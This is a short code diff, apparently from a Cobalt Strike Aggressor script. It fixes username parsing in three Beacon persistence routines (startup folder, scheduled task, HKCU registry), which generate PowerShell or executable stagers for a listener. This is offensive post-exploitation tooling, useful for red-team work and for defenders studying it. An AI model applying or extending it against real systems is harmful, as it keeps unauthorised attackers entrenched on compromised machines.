@@ -28,7 +28,7 @@ sub startup_folder
 
         blog2($bid, "Tasked Beacon to install Startup Persistence using " . listener_describe($1));
 
-        $username = binfo($bid[0], "user");
+        $username = split(" ", binfo($bid[0], "user"))[0];
         $artifact = artifact_stager($1, "powershell", "x64");
         $comp = powershell_compress($artifact);
         $cmd = powershell_command($comp, false);
@@ -51,7 +51,7 @@ sub scheduled_task
 
         blog2($bid, "Tasked Beacon to install Scheduled Task Persistence using " . listener_describe($listener));
 
-        $username = binfo($bid[0], "user");
+        $username = split(" ", binfo($bid[0], "user"))[0];
         $artifact = artifact_stager($listener, "powershell", "x64");
         $comp = powershell_compress($artifact);
         $filename = get_random_filename();
@@ -83,7 +83,7 @@ sub hkcu_persistence
 
         blog2($bid, "Tasked Beacon to install HKCU Persistence using " . listener_describe($1));
 
-        $username = binfo($bid[0], "user");
+        $username = split(" ", binfo($bid[0], "user"))[0];
         $artifact = artifact_stager($1, "exe", "x64");
         $filename = get_random_filename();
 
